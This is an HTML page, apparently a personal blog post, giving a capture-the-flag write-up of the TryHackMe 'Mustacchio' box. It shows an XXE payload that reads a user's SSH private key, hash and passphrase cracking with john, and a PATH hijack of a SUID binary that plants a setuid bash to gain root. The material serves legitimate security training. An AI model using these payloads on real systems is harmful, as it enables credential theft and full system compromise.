@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mustacchio TryHackMe | Aadi Jamadar</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+        color: #e0e0e0;
+        line-height: 1.8;
+        min-height: 100vh;
+      }
+
+      .container {
+        max-width: 900px;
+        margin: 0 auto;
+        padding: 20px;
+      }
+
+      .back-link {
+        display: inline-block;
+        margin: 20px 0;
+        padding: 10px 20px;
+        background: rgba(255, 255, 255, 0.1);
+        border: 2px solid #00ff88;
+        color: #00ff88;
+        text-decoration: none;
+        border-radius: 8px;
+        transition: all 0.3s ease;
+        font-weight: 600;
+      }
+
+      .back-link:hover {
+        background: #00ff88;
+        color: #0f0c29;
+        transform: translateX(-5px);
+      }
+
+      article {
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 15px;
+        padding: 40px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        margin-bottom: 40px;
+      }
+
+      .writeup-header {
+        margin-bottom: 30px;
+        padding-bottom: 20px;
+        border-bottom: 2px solid rgba(0, 255, 136, 0.3);
+      }
+
+      h1 {
+        font-size: 2.5em;
+        margin-bottom: 15px;
+        background: linear-gradient(45deg, #00ff88, #00ccff);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+
+      .meta-info {
+        display: flex;
+        gap: 15px;
+        flex-wrap: wrap;
+        margin-bottom: 15px;
+      }
+
+      .tag {
+        padding: 6px 15px;
+        background: rgba(0, 255, 136, 0.2);
+        border-radius: 15px;
+        font-size: 0.85em;
+        color: #00ff88;
+        border: 1px solid #00ff88;
+      }
+
+      .difficulty {
+        padding: 6px 15px;
+        border-radius: 15px;
+        font-size: 0.85em;
+        font-weight: 600;
+      }
+
+      .easy {
+        background: #4caf50;
+        color: white;
+      }
+
+      .medium {
+        background: #ff9800;
+        color: white;
+      }
+
+      .hard {
+        background: #f44336;
+        color: white;
+      }
+
+      .date {
+        color: #b0b0b0;
+        font-size: 0.9em;
+      }
+
+      h2 {
+        color: #00ccff;
+        margin-top: 35px;
+        margin-bottom: 15px;
+        font-size: 1.8em;
+        padding-bottom: 10px;
+        border-bottom: 1px solid rgba(0, 204, 255, 0.3);
+      }
+
+      h3 {
+        color: #00ff88;
+        margin-top: 25px;
+        margin-bottom: 12px;
+        font-size: 1.4em;
+      }
+
+      h4 {
+        color: #a0a0a0;
+        margin-top: 20px;
+        margin-bottom: 10px;
+        font-size: 1.1em;
+      }
+
+      p {
+        margin-bottom: 15px;
+        color: #d0d0d0;
+      }
+
+      code {
+        background: rgba(0, 0, 0, 0.4);
+        padding: 3px 8px;
+        border-radius: 4px;
+        color: #00ff88;
+        font-family: "Courier New", monospace;
+        font-size: 0.9em;
+        border: 1px solid rgba(0, 255, 136, 0.3);
+      }
+
+      pre {
+        background: rgba(0, 0, 0, 0.5);
+        padding: 20px;
+        border-radius: 8px;
+        overflow-x: auto;
+        margin: 20px 0;
+        border: 1px solid rgba(0, 255, 136, 0.3);
+        position: relative;
+      }
+
+      pre code {
+        background: none;
+        padding: 0;
+        border: none;
+        color: #e0e0e0;
+        display: block;
+        line-height: 1.6;
+      }
+
+      .code-header {
+        background: rgba(0, 255, 136, 0.1);
+        padding: 8px 15px;
+        border-radius: 8px 8px 0 0;
+        margin: 20px 0 0 0;
+        color: #00ff88;
+        font-size: 0.85em;
+        font-weight: 600;
+        border: 1px solid rgba(0, 255, 136, 0.3);
+        border-bottom: none;
+      }
+
+      .code-header + pre {
+        margin-top: 0;
+        border-radius: 0 0 8px 8px;
+      }
+
+      blockquote {
+        border-left: 4px solid #00ff88;
+        padding-left: 20px;
+        margin: 20px 0;
+        color: #b0b0b0;
+        font-style: italic;
+        background: rgba(0, 255, 136, 0.05);
+        padding: 15px 20px;
+        border-radius: 0 8px 8px 0;
+      }
+
+      ul,
+      ol {
+        margin: 15px 0 15px 30px;
+        color: #d0d0d0;
+      }
+
+      li {
+        margin-bottom: 8px;
+      }
+
+      a {
+        color: #00ccff;
+        text-decoration: none;
+        border-bottom: 1px solid transparent;
+        transition: all 0.3s ease;
+      }
+
+      a:hover {
+        color: #00ff88;
+        border-bottom-color: #00ff88;
+      }
+
+      img {
+        max-width: 100%;
+        height: auto;
+        border-radius: 8px;
+        margin: 20px 0;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+      }
+
+      table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 20px 0;
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 8px;
+        overflow: hidden;
+      }
+
+      th {
+        background: rgba(0, 255, 136, 0.2);
+        color: #00ff88;
+        padding: 12px;
+        text-align: left;
+        font-weight: 600;
+      }
+
+      td {
+        padding: 12px;
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
+      }
+
+      tr:hover {
+        background: rgba(255, 255, 255, 0.05);
+      }
+
+      .info-box {
+        background: rgba(0, 204, 255, 0.1);
+        border-left: 4px solid #00ccff;
+        padding: 15px 20px;
+        margin: 20px 0;
+        border-radius: 0 8px 8px 0;
+      }
+
+      .warning-box {
+        background: rgba(255, 152, 0, 0.1);
+        border-left: 4px solid #ff9800;
+        padding: 15px 20px;
+        margin: 20px 0;
+        border-radius: 0 8px 8px 0;
+      }
+
+      .success-box {
+        background: rgba(76, 175, 80, 0.1);
+        border-left: 4px solid #4caf50;
+        padding: 15px 20px;
+        margin: 20px 0;
+        border-radius: 0 8px 8px 0;
+      }
+
+      hr {
+        border: none;
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
+        margin: 30px 0;
+      }
+
+      .toc {
+        background: rgba(0, 0, 0, 0.3);
+        padding: 20px;
+        border-radius: 8px;
+        margin: 20px 0;
+        border: 1px solid rgba(0, 255, 136, 0.3);
+      }
+
+      .toc h3 {
+        margin-top: 0;
+        color: #00ff88;
+      }
+
+      .toc ul {
+        margin-left: 20px;
+      }
+
+      footer {
+        text-align: center;
+        padding: 30px;
+        color: #808080;
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
+      }
+
+      @media (max-width: 768px) {
+        article {
+          padding: 20px;
+        }
+
+        h1 {
+          font-size: 1.8em;
+        }
+
+        h2 {
+          font-size: 1.4em;
+        }
+
+        pre {
+          padding: 15px;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <a href="index.html" class="back-link">← Back to Writeups</a>
+
+      <article>
+        <div class="writeup-header">
+          <h1>Mustacchio</h1>
+          <div class="meta-info">
+            <span class="tag">Web Exploitation</span>
+            <span class="tag">XXE</span>
+            <span class="tag">PATH Hijacking</span>
+            <span class="difficulty easy">Easy</span>
+          </div>
+          <div class="date">Published: August 13, 2025</div>
+        </div>
+
+        <!-- Table of Contents -->
+        <div class="toc">
+          <h3>Table of Contents</h3>
+          <ul>
+            <li><a href="#overview">Challenge Overview</a></li>
+            <li><a href="#recon">Reconnaissance</a></li>
+            <li><a href="#exploitation">Exploitation</a></li>
+            <li><a href="#conclusion">Conclusion</a></li>
+          </ul>
+        </div>
+
+        <!-- Content starts here -->
+        <hr />
+        <h2 id="overview">Overview</h2>
+        <p>
+          <strong
+            ><em
+              >Mustacchio hides secrets behind a misconfigured XML parser and
+              insecure backup files. With smart directory busting and crafted
+              XML payloads, it&#39;s possible to exfiltrate sensitive SSH keys,
+              escalate privileges via PATH hijacking, and ultimately claim
+              root.</em
+            ></strong
+          >
+        </p>
+        <hr />
+        <h2 id="recon">🔍 Initial Enumeration</h2>
+        <ul>
+          <li>
+            <p>Nmap scan revealed three open ports:</p>
+            <pre><code class="lang-bash"><span class="hljs-number">22</span>/tcp   <span class="hljs-literal">open</span>  ssh
+<span class="hljs-number">80</span>/tcp   <span class="hljs-literal">open</span>  http
+<span class="hljs-number">8657</span>/tcp <span class="hljs-literal">open</span>  unknown (<span class="hljs-literal">custom</span> <span class="hljs-literal">admin</span> panel)
+</code></pre>
+          </li>
+          <li>
+            <p>Navigated to <code>http://10.10.X.X/</code> → Basic webpage</p>
+          </li>
+          <li>
+            <p>Ran Gobuster:</p>
+            <pre><code class="lang-bash">gobuster dir -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.X.X -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb<span class="hljs-regexp">/common.txt</span>
+</code></pre>
+          </li>
+        </ul>
+        <p>✅ Discovered <code>/custom/</code> directory</p>
+        <hr />
+        <h2 id="-cracked-admin-credentials">📂 Cracked Admin Credentials</h2>
+        <ul>
+          <li>
+            <p>Found user data in exposed file:</p>
+            <pre><code>/custom/users<span class="hljs-meta">.db</span>
+</code></pre>
+          </li>
+          <li>
+            <p>Contained:</p>
+            <pre><code><span class="hljs-string">Username:</span> admin
+Password <span class="hljs-string">hash:</span> [hashed]
+</code></pre>
+          </li>
+          <li>
+            <p>
+              Cracked using <code>john</code> + <code>rockyou.txt</code><br />✅
+              Password: <code>bulldog19</code>
+            </p>
+          </li>
+        </ul>
+        <hr />
+        <h2 id="-admin-panel-access-port-8657-">
+          🔐 Admin Panel Access (Port 8657)
+        </h2>
+        <ul>
+          <li>Visited: <code>http://10.10.X.X:8657</code></li>
+          <li>
+            <p>Logged in with:</p>
+            <ul>
+              <li>Username: <code>admin</code></li>
+              <li>Password: <code>bulldog19</code></li>
+            </ul>
+          </li>
+          <li>
+            <p>After login → saw a <strong>comment box form</strong></p>
+          </li>
+          <li>
+            <p>Source page revealed a backup file:</p>
+            <ul>
+              <li><code>dontforget.bak</code></li>
+            </ul>
+          </li>
+          <li>
+            <p>The <code>.bak</code> file exposed XML structure:</p>
+            <pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">comment</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">com</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">com</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">comment</span>&gt;</span>
+</code></pre>
+          </li>
+        </ul>
+        <hr />
+        <h2 id="exploitation">
+          🪓 XXE Exploit → SSH Key Exfiltration
+        </h2>
+        <ul>
+          <li>
+            <p>Crafted XML payload:</p>
+            <pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE comment [
+  &lt;!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"&gt;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">comment</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Aadi<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>Barry<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">com</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">com</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">comment</span>&gt;</span>
+</code></pre>
+          </li>
+          <li>
+            <p>
+              Submitted via comment box<br />✅ Dumped
+              <strong>Barry’s <code>id_rsa</code> private key</strong>
+            </p>
+          </li>
+        </ul>
+        <hr />
+        <h2 id="-cracking-barry-s-ssh-key">🔓 Cracking Barry’s SSH Key</h2>
+        <ul>
+          <li><p>Key was encrypted with passphrase</p></li>
+          <li>
+            <p>Converted and cracked with:</p>
+            <pre><code class="lang-bash">ssh2john id_rsa &gt; hash<span class="hljs-selector-class">.txt</span>
+john --wordlist=/usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> hash.txt
+</code></pre>
+          </li>
+        </ul>
+        <p>✅ Passphrase found<br />✅ SSH as Barry:</p>
+        <pre><code class="lang-bash">ssh -<span class="hljs-selector-tag">i</span> id_rsa barry@<span class="hljs-number">10.10</span><span class="hljs-selector-class">.X</span><span class="hljs-selector-class">.X</span>
+</code></pre>
+        <hr />
+        <h2 id="-user-access-barry-">🧍 User Access (barry)</h2>
+        <ul>
+          <li>
+            <p>
+              Retrieved <code>user.txt</code> from Barry&#39;s home directory ✅
+            </p>
+          </li>
+          <li>
+            <p>
+              Enumerated <code>/etc/passwd</code><br />✅ Discovered second
+              user: <code>joe</code>
+            </p>
+          </li>
+        </ul>
+        <hr />
+        <h2 id="-privilege-escalation-root">📦 Privilege Escalation → Root</h2>
+        <h3 id="-found-suid-binary-">🔎 Found SUID binary:</h3>
+        <pre><code class="lang-bash">/<span class="hljs-built_in">home</span>/joe/live_log
+</code></pre>
+        <ul>
+          <li>
+            <p>SUID-root:</p>
+            <pre><code class="lang-bash">-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">13337</span> live_log
+</code></pre>
+          </li>
+          <li>
+            <p>Running binary showed:</p>
+            <pre><code class="lang-bash">tail -f /var/<span class="hljs-built_in">log</span>/nginx/<span class="hljs-keyword">access</span>.<span class="hljs-built_in">log</span>
+</code></pre>
+          </li>
+          <li>
+            <p>
+              <code>tail</code> is <strong>called without full path</strong> →
+              vulnerable to <code>$PATH</code> hijack
+            </p>
+          </li>
+        </ul>
+        <hr />
+        <h2 id="-path-hijack-exploit">💣 PATH Hijack Exploit</h2>
+        <ul>
+          <li>
+            <p>Created malicious fake <code>tail</code>:</p>
+            <pre><code class="lang-bash">mkdir <span class="hljs-regexp">/tmp/</span>faketools
+echo -e <span class="hljs-string">'#!/bin/bash\ncp /bin/bash /tmp/rooted\nchmod +s /tmp/rooted'</span> &gt; <span class="hljs-regexp">/tmp/</span>faketools/tail
+chmod +x <span class="hljs-regexp">/tmp/</span>faketools/tail
+</code></pre>
+          </li>
+          <li>
+            <p>Hijacked PATH and ran:</p>
+            <pre><code class="lang-bash">export PATH=<span class="hljs-regexp">/tmp/</span>faketools:<span class="hljs-variable">$PATH</span>
+<span class="hljs-regexp">/home/</span>joe<span class="hljs-regexp">/live_log</span>
+</code></pre>
+          </li>
+          <li>
+            <p>Executed:</p>
+            <pre><code class="lang-bash"><span class="hljs-regexp">/tmp/</span>rooted -p
+</code></pre>
+          </li>
+        </ul>
+        <p>✅ Got root shell<br />✅ Retrieved <code>/root/root.txt</code></p>
+        <hr />
+        <h2 id="-summary">🧠 Summary</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Step</th>
+              <th>Description</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>🔍 1</td>
+              <td>
+                Found 3 open ports (<code>22</code>, <code>80</code>,
+                <code>8657</code>)
+              </td>
+            </tr>
+            <tr>
+              <td>🛠️ 2</td>
+              <td>Gobusted <code>/custom/</code>, found admin hash</td>
+            </tr>
+            <tr>
+              <td>🔑 3</td>
+              <td>
+                Cracked hash → <code>bulldog19</code>, logged into admin panel
+              </td>
+            </tr>
+            <tr>
+              <td>🪓 4</td>
+              <td>XXE exploited to steal Barry’s SSH key</td>
+            </tr>
+            <tr>
+              <td>🧑‍💻 5</td>
+              <td>Cracked passphrase, SSH’d into Barry</td>
+            </tr>
+            <tr>
+              <td>🧍‍♂️ 6</td>
+              <td>Found SUID binary under <code>joe</code></td>
+            </tr>
+            <tr>
+              <td>💣 7</td>
+              <td>PATH Hijack → Copied SUID bash → Got root</td>
+            </tr>
+          </tbody>
+        </table>
+        <hr />
+        <h2 id="conclusion">😎 Final Thoughts</h2>
+        <ul>
+          <li>
+            <p>This box was 🔥 for practicing:</p>
+            <ul>
+              <li>XML External Entity (XXE)</li>
+              <li>Directory brute-force enumeration</li>
+              <li>Cracking and SSH access</li>
+              <li>PATH Hijacking with SUID binaries</li>
+            </ul>
+          </li>
+          <li>
+            <p>
+              Realistic attack chain from web exploit → user shell → root
+              privesc.
+            </p>
+          </li>
+        </ul>
+        <hr />
+        <h2 id="-cleanup">🧼 Cleanup</h2>
+        <pre><code class="lang-bash">rm -rf <span class="hljs-regexp">/tmp/</span>faketools
+rm <span class="hljs-regexp">/tmp/</span>rooted
+unset PATH
+</code></pre>
+      </article>
+      <footer>
+        <p>&copy; 2025 Aadi Jamadar. All rights reserved.</p>
+      </footer>
+    </div>
+  </body>
+</html>
